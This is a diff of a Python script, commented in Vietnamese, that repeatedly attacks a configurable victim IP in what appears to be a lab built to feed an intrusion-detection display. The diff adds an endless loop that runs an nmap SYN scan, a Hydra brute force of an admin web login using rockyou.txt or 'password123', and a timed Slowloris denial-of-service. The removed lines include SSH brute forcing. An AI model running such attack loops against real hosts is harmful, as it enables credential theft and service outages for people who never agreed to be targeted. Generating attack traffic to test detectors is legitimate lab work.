@@ -20,38 +20,40 @@ def run_command(command, description):
         process.terminate()
 
 def attack_pipeline():
-    # Bước 1: Port Scan (Quét cổng)
-    run_command(f"nmap -sS -A -T4 {VICTIM_IP}", "Quét toàn bộ cổng bằng Nmap (Phát hiện PortScan)")
-    time.sleep(5) # Nghỉ 5s để phân tách dữ liệu
+    print("\n[ATTACK] Kích hoạt chế độ Tấn công Liên tục (Live Detection Mode)")
+    round_num = 1
+    while True:
+        print(f"\n{'='*50}")
+        print(f"--- BẮT ĐẦU ĐỢT TẤN CÔNG SỐ {round_num} ---")
+        print(f"{'='*50}")
 
-    # Bước 2: Brute Force Web (Dò mật khẩu Admin)
-    # Yêu cầu Máy 1 phải có file wordlist rockyou.txt tại /usr/share/wordlists/
-    if os.path.exists("/usr/share/wordlists/rockyou.txt"):
-        run_command(f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {VICTIM_IP} http-get /login.php", "Web Brute Force (Hydra)")
-    else:
-        print("[!] Không tìm thấy rockyou.txt, bỏ qua Web Brute Force.")
-        # Chạy tạm bằng list nhỏ
-        run_command(f"hydra -l admin -p password123 {VICTIM_IP} http-get /login.php", "Web Brute Force (Hydra - Mini)")
-    
-    time.sleep(5)
+        # Bước 1: Port Scan (Quét cổng)
+        run_command(f"nmap -sS -T4 -p 1-1000 {VICTIM_IP}", "Quét 1000 cổng đầu tiên (Nmap)")
+        time.sleep(10) # Nghỉ 10s cho GUI hiển thị
 
-    # Bước 3: Brute Force SSH (Dò mật khẩu SSH)
-    run_command(f"hydra -l admin -p password123 ssh://{VICTIM_IP}", "SSH Brute Force")
-    time.sleep(5)
+        # Bước 2: Brute Force Web
+        if os.path.exists("/usr/share/wordlists/rockyou.txt"):
+            run_command(f"timeout 30s hydra -l admin -P /usr/share/wordlists/rockyou.txt {VICTIM_IP} http-get /login.php", "Web Brute Force 30s")
+        else:
+            run_command(f"timeout 30s hydra -l admin -p password123 {VICTIM_IP} http-get /login.php", "Web Brute Force (Mini)")
+        time.sleep(10)
 
-    # Bước 4: Tấn công DoS (Slowloris)
-    print("\n[ATTACK] Kích hoạt DoS Slowloris. Sẽ tự động dừng sau 60 giây...")
-    try:
-        # Chạy slowloris trong 60 giây rồi kill
-        subprocess.run(f"timeout 60s slowloris {VICTIM_IP} -p 80 -s 500", shell=True)
-    except Exception as e:
-        print(f"Lỗi chạy Slowloris: {e}")
+        # Bước 3: Tấn công DoS (Slowloris)
+        print("\n[ATTACK] Kích hoạt DoS Slowloris. Chạy trong 30 giây...")
+        try:
+            subprocess.run(f"timeout 30s slowloris {VICTIM_IP} -p 80 -s 200", shell=True)
+        except Exception as e:
+            pass
+        
+        print(f"\n--- ĐÃ XONG ĐỢT TẤN CÔNG {round_num}. NGHỈ 20 GIÂY ĐỂ GUI LÀM DỊU... ---")
+        time.sleep(20)
+        round_num += 1
 
 if __name__ == "__main__":
     if "192.168.x.x" in VICTIM_IP:
-        print("[LỖI] Vui lòng chỉnh sửa biến VICTIM_IP thành IP thật của Laptop 2.")
+        print("[LỖI] Vui lòng chỉnh sửa biến VICTIM_IP thành IP thật của Máy Nạn Nhân.")
         exit(1)
         
     print(f"=== BẮT ĐẦU KỊCH BẢN TẤN CÔNG VÀO {VICTIM_IP} ===")
     attack_pipeline()
-    print("\n=== HOÀN THÀNH KỊCH BẢN TẤN CÔNG ===")
+
